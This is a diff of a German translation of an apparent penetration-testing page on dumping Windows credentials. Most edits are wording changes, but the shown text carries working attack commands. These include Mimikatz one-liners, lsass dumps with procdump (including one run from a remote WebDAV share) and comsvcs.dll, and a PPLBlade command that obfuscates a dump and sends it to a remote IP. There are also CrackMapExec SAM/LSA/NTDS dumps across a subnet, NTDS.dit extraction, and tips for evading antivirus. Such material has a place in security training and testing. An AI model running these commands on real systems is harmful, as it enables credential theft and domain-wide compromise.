@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Finde andere Dinge, die Mimikatz tun kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**
+**Finde andere Dinge, die Mimikatz tun kann auf** [**dieser Seite**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -50,13 +50,17 @@ mimikatz_command -f "lsadump::sam"
 ### Procdump + Mimikatz
 
 Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
-Sie können dieses Tool verwenden, um **den lsass-Prozess zu dumpen**, **den Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.
+Sie können dieses Tool verwenden, um **den lsass-Prozess zu dumpen**, **den Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump **zu extrahieren**.
+
+Sie könnten auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -67,14 +71,14 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Daher ist es **stealthier**, den **PID** von lsass.exe als **Argument** an procdump **statt des** **Namens lsass.exe** zu übergeben.
+**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Daher ist es **unauffälliger**, den **PID** von lsass.exe als **Argument** an procdump **statt** den **Namen lsass.exe** zu übergeben.
 
 ### Dumpen von lsass mit **comsvcs.dll**
 
 Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist verantwortlich für das **Dumpen des Prozessspeichers** im Falle eines Absturzes. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die dazu gedacht ist, mit `rundll32.exe` aufgerufen zu werden.\
 Es ist irrelevant, die ersten beiden Argumente zu verwenden, aber das dritte ist in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, stellt die erste Komponente dar, der Speicherort der Dump-Datei repräsentiert die zweite, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine alternativen Optionen.\
 Nach der Analyse dieser drei Komponenten wird die DLL aktiviert, um die Dump-Datei zu erstellen und den Speicher des angegebenen Prozesses in diese Datei zu übertragen.\
-Die Verwendung von **comsvcs.dll** ist möglich, um den lsass-Prozess zu dumpen, wodurch die Notwendigkeit entfällt, procdump hochzuladen und auszuführen. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Die Nutzung von **comsvcs.dll** ist möglich, um den lsass-Prozess zu dumpen, wodurch die Notwendigkeit entfällt, procdump hochzuladen und auszuführen. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Der folgende Befehl wird zur Ausführung verwendet:
 ```bash
@@ -82,14 +86,14 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**
 
-### **Dumping lsass mit dem Task-Manager**
+### **Dumpen von lsass mit dem Task-Manager**
 
 1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und wählen Sie den Task-Manager aus.
 2. Klicken Sie auf Weitere Details.
 3. Suchen Sie im Tab Prozesse nach dem Prozess "Local Security Authority Process".
 4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und wählen Sie "Dump-Datei erstellen".
 
-### Dumping lsass mit procdump
+### Dumpen von lsass mit procdump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
 ```
@@ -103,7 +107,7 @@ Get-Process -Name LSASS
 **Hauptfunktionen**:
 
 1. Umgehung des PPL-Schutzes
-2. Obfuskation von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
+2. Obfuskierung von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
 3. Hochladen von Speicherdumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
@@ -118,7 +122,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dumpen Sie die NTDS.dit vom Ziel-DC
+### NTDS.dit vom Ziel-DC dumpen
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -167,7 +171,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Aber Sie können dasselbe mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (die verwendete Festplatte ist "C:" und sie wird in C:\users\Public gespeichert), aber Sie können dies auch verwenden, um jede geschützte Datei zu kopieren:
+Aber Sie können dasselbe mit **Powershell** tun. Dies ist ein Beispiel für **wie man die SAM-Datei kopiert** (die verwendete Festplatte ist "C:" und sie wird in C:\users\Public gespeichert), aber Sie können dies auch verwenden, um jede geschützte Datei zu kopieren:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -184,17 +188,17 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory-Anmeldeinformationen - NTDS.dit**
 
-Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passwort-Hashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.
+Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passworthashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.
 
 Innerhalb dieser Datenbank werden drei Haupttabellen verwaltet:
 
-- **Datentabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
-- **Verknüpfungstabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
-- **SD-Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gespeichert, um die Sicherheit und den Zugriff auf die gespeicherten Objekte zu gewährleisten.
+- **Daten Tabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
+- **Link Tabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
+- **SD Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gehalten, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.
 
 Weitere Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Ein **Teil** der **NTDS.dit**-Datei könnte sich **im `lsass`-Speicher** befinden (Sie können die zuletzt abgerufenen Daten wahrscheinlich aufgrund der Leistungsverbesserung durch die Verwendung eines **Caches** finden).
+Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Ein **Teil** der **NTDS.dit**-Datei könnte **im `lsass`**-Speicher gefunden werden (Sie können die zuletzt abgerufenen Daten wahrscheinlich aufgrund der Leistungsverbesserung durch die Verwendung eines **Caches** finden).
 
 #### Entschlüsselung der Hashes in NTDS.dit
 
@@ -204,7 +208,7 @@ Der Hash ist dreimal verschlüsselt:
 2. Entschlüsseln des **Hashes** mit **PEK** und **RC4**.
 3. Entschlüsseln des **Hashes** mit **DES**.
 
-**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch im **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterschiedlich zwischen Domänencontrollern)** verschlüsselt. Aus diesem Grund müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.
+**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch im **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterschiedlich zwischen Domänencontrollern)** verschlüsselt. Deshalb müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.
 
 ### Kopieren von NTDS.dit mit Ntdsutil
 
@@ -212,7 +216,7 @@ Verfügbar seit Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Sie könnten auch den [**Volume Shadow Copy**](#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM Datei** benötigen (nochmals, [**dumpen Sie sie aus der Registry oder verwenden Sie den Volume Shadow Copy**](#stealing-sam-and-system) Trick).
+Sie können auch den [**Volume Shadow Copy**](#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM-Datei** benötigen (nochmals, [**dumpen Sie sie aus der Registry oder verwenden Sie den Volume Shadow Copy**](#stealing-sam-and-system) Trick).
 
 ### **Hashes aus NTDS.dit extrahieren**
 
@@ -234,11 +238,11 @@ NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqli
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, zusätzliche Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitshierarchie und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensart, Richtung und Attributen...
+Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitenbaum und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensarten, Richtung und Attributen...
 
 ## Lazagne
 
-Laden Sie die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese Binärdatei verwenden, um Anmeldeinformationen aus mehreren Softwareanwendungen zu extrahieren.
+Laden Sie die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese Binärdatei verwenden, um Anmeldeinformationen aus mehreren Software zu extrahieren.
 ```
 lazagne.exe all
 ```
@@ -265,7 +269,7 @@ type outpwdump
 ```
 ### PwDump7
 
-Laden Sie es herunter von: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und **führen Sie es einfach aus**, und die Passwörter werden extrahiert.
+Laden Sie es von:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und **führen Sie es einfach aus**, und die Passwörter werden extrahiert.
 
 ## Defenses
 
